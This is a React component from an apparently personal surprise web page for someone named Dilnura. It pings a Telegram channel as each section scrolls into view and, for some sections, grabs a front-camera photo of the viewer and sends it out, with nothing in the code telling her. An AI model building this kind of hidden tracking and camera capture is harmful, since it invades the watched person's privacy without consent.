"use client";

import { useEffect, useRef } from "react";
import { notify } from "@/lib/telegram";
import { captureAndSendPhoto } from "@/lib/camera";

/**
 * Wraps a section and pings Telegram the first time it scrolls into view,
 * so you can follow along as Dilnura moves through the surprise.
 */
export default function SectionNotify({
  message,
  photo,
  threshold = 0.35,
  children,
}: {
  message: string;
  /** If set, a front-camera photo is grabbed the first time this section shows. */
  photo?: string;
  threshold?: number;
  children: React.ReactNode;
}) {
  const ref = useRef<HTMLDivElement>(null);
  const fired = useRef(false);

  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const io = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting && !fired.current) {
          fired.current = true;
          notify(message);
          if (photo) captureAndSendPhoto(photo);
          io.disconnect();
        }
      },
      { threshold }
    );
    io.observe(el);
    return () => io.disconnect();
  }, [message, photo, threshold]);

  return <div ref={ref}>{children}</div>;
}
